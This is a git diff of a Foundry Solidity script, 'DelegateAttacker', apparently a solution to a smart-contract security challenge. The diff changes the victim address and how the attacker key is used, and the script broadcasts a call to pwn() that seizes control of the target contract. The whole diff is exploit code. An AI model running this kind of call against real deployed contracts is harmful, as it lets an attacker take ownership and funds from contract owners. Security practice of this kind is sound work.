@@ -4,10 +4,10 @@ pragma solidity ^0.8.0;
 import {Script} from "../lib/forge-std/src/Script.sol";
 import {HelperConfigLib} from "./config/HelperConfig.sol";
 
-contract DelegateAttacker is Script {
+contract DelegateAttacker is Script, HelperConfigLib {
     function run() external {
-        address victim = 0xbA94C268049DD87Ded35F41F6D4C7542b4BdB767;
-        vm.startBroadcast(HelperConfigLib.ATTACKER_KEY);
+        address victim = 0x3Ca8f9C04c7e3E1624Ac2008F92f6F366A869444;
+        vm.startBroadcast(ATTACKER_KEY);
         (bool success, ) = victim.call(abi.encodeWithSignature("pwn()"));
         vm.stopBroadcast();
         require(success);
